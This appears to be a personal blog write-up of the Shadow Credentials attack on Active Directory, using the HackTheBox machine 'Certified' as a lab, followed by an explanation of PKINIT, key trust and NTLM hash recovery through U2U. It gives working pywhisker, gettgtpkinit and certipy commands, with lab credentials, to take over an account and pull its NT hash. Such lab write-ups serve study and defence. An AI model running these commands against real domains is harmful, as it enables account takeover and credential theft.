---
title: shadow credentiels
published: 2025-03-08
description: ''
image:  ../../assets/shadow_credentiels/shadow-credentials.webp
tags: [AD, PKINIT, ACL]
category: ''
draft: false 
lang: ''
---

The Shadow Credentials attack is a technique used to compromise Active Directory (AD) by abusing Kerberos authentication and modifying specific attributes of AD objects to gain unauthorized access.

shadow credentials occurs when an attacker have rights to modify the `msDS-KeyCredentialLink` (`GenericAll`_, _`GenericWrite`_ or _`WriteAccountRestrictions` ) attribute in an user/machine aacount 


## what is the `msDS-KeyCredentialLink` attribute

the `msDS-KeyCredentialLink` is used to store public key used by the account for authentication. When a certificate is added to a machine account, it is stored in this attribute.

:::warning
although most of the time the `msDS-KeyCredentialLink` is used by machine accounts it can also be used in user accounts
:::

## shadow credentiels

Managing and modifying the `msDS-KeyCredentialLink` attribute is an action that requires specific permissions, typically held by accounts that are members of highly privileged groups. (like `GenericAll`_,_ `GenericWrite` _or_ `WriteAccountRestrictions`)

#### steps:
* enumerate our users DACL rights and see if we have any of the write rights (`GenericAll`_,_ `GenericWrite` _or_ `WriteAccountRestrictions`) on an object 
* try to modify the value of the `msDS-KeyCredentialLink` attribute with attackers public key
* request a PFX certificate for this target user from the CA
* use that certificate to authenticate on behalf of the target user

![](src/assets/shadow_credentiels/Shadow%20credentiels_image_1.png)


# The attack (HTB machine 'certified')
we have control over the `MANAGEMENT` groupe that have a `genericWrite` on the `mnanagement_svc` account

![](src/assets/shadow_credentiels/Shadow%20credentiels_image_2.png)

### Exploitation

#### set the msDS-KeyCredentialLink attribute
The exploitation phase begins with populating the `msDS-KeyCredentialLink` attribute
```bash
python3 ~/work/tools/pywhisker/pywhisker/pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" --verbose
```

![](src/assets/shadow_credentiels/Shadow%20credentiels_image_3.png)

_PyWhisker_ will automatically generate a public/private keys and save it locally. It even guides you on the next steps to obtain a Ticket Granting Ticket (TGT).


#### Acquiring a TGT for the user account (management_svc)
we use the command provided by the pywishker at the end

```bash
python3 ~/work/tools/PKINITtools/gettgtpkinit.py -cert-pfx U7IaGnXc.pfx -pfx-pass zUkBgckwFjnRehrzJHup certified.htb/management_svc U7IaGnXc.ccache
```

![](src/assets/shadow_credentiels/Shadow%20credentiels_image_4.png)


#### Recover the NT Hash of the user account

1) first we need to remove the certificate password from our .pfx because certipy cant work with those:
	```bash
	certipy cert -export -pfx "U7IaGnXc.pfx" -password "zUkBgckwFjnRehrzJHup" -out unprotected_pfx.pfx
	```

2) Next, authenticate using _Certipy_ and retrieve the user’s hash through the U2U protocol:
```bash
certipy auth -pfx unprotected_pfx.pfx -username "management_svc" -domain "certified.htb"
```

![](src/assets/shadow_credentiels/Shadow%20credentiels_image_5.png)

now we can use that NTLM hash for authetication


# More detailed explanation

## What is PKI ?

the usual model for kerberos authentication is asking the KDC for a TGT by sending the encrypted timestamp using the user's password hash
![](src/assets/shadow_credentiels/Shadow%20credentiels_image_6.png)

this uses symmetric cryptography schemes like RC4, AES ..

but it is possible to do this authentication using asymmetric ciphers like RSA using PKINT


### Steps

the client generate a public-private key pair and uses the private key to sign (encrypt) the timestamp, then send it along the way with his public key (or certificate) as a `AS-REQ` request.

then the server verifies the legitimacy of the public key (certificate), and try to decrypt the  encrypted timestamp with the client public key, if the timestamp is valid then it respond with  `AS-RESP` containing the TGT and the session key

#### the session key:
the session key is used for encrypting the service tickets so it should be a secret that only the client and KDC should know.
the session key is calculated either by using **KEY EXCHANGE** or **Public Key Encryption Key Delivery** AKA **KEY ENCAPSULATION** 


![](src/assets/shadow_credentiels/Shadow%20credentiels_image_7.png)

Here because we have a CA that both parties trust it is possible to verify the legitimacy of the public key (certificate)  using certificate root of trust mechanism, but what if we dont have a PKI ?

## what if we don't have a PKI
instead of using certificate root of trust, we can use key root of trust, which uses the raw data of the public key and store it in an LDAP attribute called `msDS-KeyCredentialLink`[parsing the msDS-KeyCredentialLink attribute](https://podalirius.net/en/articles/parsing-the-msds-keycredentiallink-value-for-shadowcredentials-attack/)
```fallback
  msDS-KeyCredentialLink  | 'B:828:0002000020000108E2E5....' |
```
![](src/assets/shadow_credentiels/Shadow%20credentiels_image_8.png)

:::warning
**This means that if you can write to the msDS-KeyCredentialLink property of a user, you can obtain a TGT for that user.**
:::

## What About NTLM?
PKINIT allows WHfB users, or, more traditionally, smartcard users, to perform Kerberos authentication and obtain a TGT. But what if they need to access resources that require NTLM authentication?

the client can obtain a special TGS that contains their NTLM hash inside the PAC in an encrypted `NTLM_SUPPLEMENTAL_CREDENTIAL`

the PAC is stored in the encrypted part of the TGS, and it is encrypted with the hash of the request service, in the case of TGT it is encrypted with krbtgt password's hash

#### the U2U service
this service give users abilities to request other users NTLM hashs
YES you heard that right

BUUUT! the NTLM hash is encrypted in the ticket srvice TGS using the session key (that was calculated with the TGT) so bruteforcing or cracking this encrypted NTLM is almost impossible

![](src/assets/shadow_credentiels/Shadow%20credentiels_image_9.png)

:::warning
**This means that if you can write to the msDS-KeyCredentialLink property of a user, you can retrieve the NT hash of that user.**
:::


blog: https://i-tracing.com/blog/dacl-shadow-credentials/

original paper:  https://eladshamir.com/2021/06/21/Shadow-Credentials.html